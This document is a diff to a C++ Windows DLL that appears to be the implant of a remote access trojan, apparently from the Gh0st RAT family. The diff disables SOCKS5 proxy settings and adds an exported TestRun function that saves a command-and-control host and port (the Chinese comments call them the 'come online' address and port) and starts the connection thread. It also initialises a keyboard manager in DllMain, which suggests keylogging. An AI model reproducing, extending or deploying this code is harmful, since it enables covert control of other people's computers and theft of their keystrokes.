@@ -69,10 +69,10 @@ DWORD WINAPI main(char* lpServiceName)
 	SetErrorMode(SEM_FAILCRITICALERRORS);
 	char* lpszHost = NULL;
 	DWORD	dwPort = 80;
-	char* lpszProxyHost = NULL;
-	DWORD	dwProxyPort = 0;
-	char* lpszProxyUser = NULL;
-	char* lpszProxyPass = NULL;
+	//char* lpszProxyHost = NULL;
+	//DWORD	dwProxyPort = 0;
+	//char* lpszProxyUser = NULL;
+	//char* lpszProxyPass = NULL;
 
 	HANDLE	hEvent = NULL;
 
@@ -111,10 +111,10 @@ DWORD WINAPI main(char* lpServiceName)
 		lpszHost = g_strHost;
 		dwPort = g_dwPort;
 
-		if (lpszProxyHost != NULL)
-			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
-		else
-			socketClient.setGlobalProxyOption();
+		//if (lpszProxyHost != NULL)
+		//	socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
+		//else
+		//	socketClient.setGlobalProxyOption();
 
 		DWORD dwTickCount = GetTickCount();
 		if (!socketClient.Connect(lpszHost, dwPort))
@@ -174,6 +174,18 @@ DWORD WINAPI main(char* lpServiceName)
 
 
 
+//extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
+//定义导出函数:
+extern "C" __declspec(dllexport) void TestRun(char* strHost, int nPort)
+{
+	strcpy(g_strHost, strHost);  //保存上线地址
+	g_dwPort = nPort;             //保存上线端口
+	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
+	//这里等待线程结束
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+}
+
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -184,6 +196,10 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
     case DLL_THREAD_ATTACH:
+		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
+		//CKeyboardManager::m_dwLastMsgTime = GetTickCount();
+		//CKeyboardManager::Initialization();
+		break;
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
